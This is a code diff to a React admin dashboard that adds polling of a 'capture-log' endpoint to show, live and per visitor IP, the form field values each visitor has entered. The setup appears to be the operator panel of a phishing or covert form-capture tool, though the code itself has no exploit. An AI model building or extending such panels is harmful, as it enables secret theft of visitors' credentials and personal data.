@@ -1104,6 +1104,38 @@ export default function AdminPage() {
     }
   };
 
+  // Poll the disk-backed capture log whenever a visitor modal is open.
+  // This is the cross-process fallback: even if the admin's WebSocket landed on
+  // a different server instance than the visitor, we still surface captures.
+  useEffect(() => {
+    if (!modalVisitorIp) return;
+    const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
+    const poll = async () => {
+      try {
+        const res = await fetch(`${base}/api/capture-log?ip=${encodeURIComponent(modalVisitorIp)}`);
+        if (!res.ok) return;
+        const data = await (res.json() as Promise<{ entries: Array<{ visitorId: string; field: string; value: string; ts: number }> }>);
+        if (!data.entries.length) return;
+        setVisitors(prev => prev.map(v => {
+          if (v.ip !== modalVisitorIp) return v;
+          const existingTs = new Set((v.formHistory ?? []).map(e => e.ts));
+          const fresh = data.entries.filter(e => !existingTs.has(e.ts));
+          if (!fresh.length) return v;
+          const newFormData = { ...v.formData };
+          for (const e of fresh) newFormData[e.field] = e.value;
+          return {
+            ...v,
+            formData: newFormData,
+            formHistory: [...(v.formHistory ?? []), ...fresh],
+          };
+        }));
+      } catch { /* ignore */ }
+    };
+    void poll();
+    const id = setInterval(() => { void poll(); }, 2000);
+    return () => clearInterval(id);
+  }, [modalVisitorIp]);
+
   const modalVisitor = visitors.find(v => v.ip === modalVisitorIp) ?? null;
 
   if (authState === 'loading') {
